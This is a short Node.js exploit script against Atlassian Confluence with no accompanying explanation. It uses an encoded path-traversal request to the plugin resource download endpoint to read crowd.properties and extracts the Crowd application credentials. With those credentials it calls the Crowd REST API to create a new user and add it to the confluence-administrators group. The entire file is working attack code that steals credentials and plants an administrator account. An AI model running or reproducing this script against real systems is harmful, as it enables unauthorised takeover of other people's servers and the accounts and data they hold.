const base = process.argv[2];
const response = await fetch(base + '/s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3aWEB-INF%3a%3aclasses%3a%3acrowd.properties');
const props = Object.fromEntries((await response.text()).split('\n').filter(x => x.includes('=')).map(x => { const i = x.indexOf('='); return [x.slice(0, i).trim(), x.slice(i+1).trim()]; }));
const headers = {'Authorization': 'Basic ' + Buffer.from(props['application.name'] + ':' + props['application.password']).toString('base64'), 'Content-Type': 'application/json'};
const crowd = props['crowd.base.url'].replace(/\/$/, '');
await fetch(crowd + '/rest/usermanagement/1/user', {method: 'POST', headers, body: JSON.stringify({name: process.argv[3], active: true, password: {value: process.argv[4]}})});
await fetch(crowd + '/rest/usermanagement/1/group/user/direct?groupname=confluence-administrators', {method: 'POST', headers, body: JSON.stringify({name: process.argv[3]})});
